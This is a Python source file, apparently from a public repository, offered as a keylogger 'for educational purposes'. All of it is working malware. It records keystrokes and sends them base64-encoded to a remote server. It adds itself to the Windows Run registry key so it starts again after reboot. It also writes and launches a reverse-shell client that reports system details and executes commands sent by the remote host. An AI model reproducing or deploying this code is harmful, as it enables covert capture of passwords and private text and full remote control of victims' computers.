########### keylogger  ########
########### Author: Nadav Yarkon #############
##This tool is for educational purposes only. don't use them for illegal activities!##

#Author: Nadav Yarkon
#Email: Nadavy2469 @ gmail.com
#https: https://github.com/Nadav-Yarkon


from winreg import HKEY_CURRENT_USER, OpenKey, KEY_ALL_ACCESS, SetValueEx, REG_SZ
from pynput.keyboard import Key, Listener
import socket
import platform
import threading
import base64
import codecs

keys=[]
sock_info=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def ConnectToServer():
    HOST = ##<Enter Host>
    PORT = ##<Enter Port>
    sock_info.connect((HOST, PORT))

def on_press(key):
    global keys
    if key == Key.enter:
        sock_info.sendall(base64.b64encode(''.join(keys).encode()))
        keys.clear()
    elif key == Key.space:
        keys.append(" ")
    elif key == Key.backspace:
        if len(keys)>0:
            keys.pop()
    else:
        v = str(key).replace("'", "")
        keys.append(v)

def AddToStartup():
    import os
    pathFile = os.path.dirname(os.path.realpath(__file__))
    nameFile = "Keylogger.py"
    fullPath = os.path.join(pathFile , nameFile)
    regPath = 'Software\Microsoft\Windows\CurrentVersion\Run'
    path_add_reg = OpenKey(HKEY_CURRENT_USER, regPath, 0, KEY_ALL_ACCESS)
    SetValueEx(path_add_reg, "Keylogger", 0, REG_SZ, fullPath)


def RunSecondClient():
    import ClientShell
    thread1 = threading.Thread(target = ClientShell.main , args = (sock_info.getpeername()[0] , (sock_info.getpeername()[1] + 1)))
    thread1.start()

def CreateCilentShell():
    pyfile = codecs.open('ClientShell.py', 'w' , "utf-8")
    message = """
    
import subprocess
import socket
import time
import platform

def ConnectToServer(IP ,Port):
    sock_info = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    HOST = IP
    PORT = int(Port) 
    sock_info.connect((HOST, PORT))
    return sock_info

def OsInformatio(socket):
    socket.sendall(str("Os: " + platform.system()).encode())
    time.sleep(1)
    socket.sendall(str("Machine: " + platform.machine()).encode())
    time.sleep(1)
    socket.sendall(str("Platform: " + platform.platform()).encode())
    time.sleep(1)
    socket.sendall(str("processor name: " + platform.processor()).encode())
    time.sleep(1)
    socket.sendall(str("Python version: " + platform.python_version()).encode())
    time.sleep(1)
    socket.sendall(str("system’s release version: " + platform.version()).encode())

def RunCommand(socket):
    while True:
            command = socket.recv(4096)
            command = command.decode('UTF-8')
            commandOut = (subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read())
            commandErr = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE).stderr.read()
            if commandOut is None and  commandErr is None:
                time.sleep(5)
            socket.sendall(commandOut + commandErr)

def main(IP , Port):
    socket=ConnectToServer(IP , Port)
    OsInformatio(socket)
    RunCommand(socket)
    """
    pyfile.write(message)
    pyfile.close()

def main():
    CreateCilentShell()
    AddToStartup()
    ConnectToServer()
    RunSecondClient()
    with Listener(on_press=on_press) as listener:
        listener.join()

main()



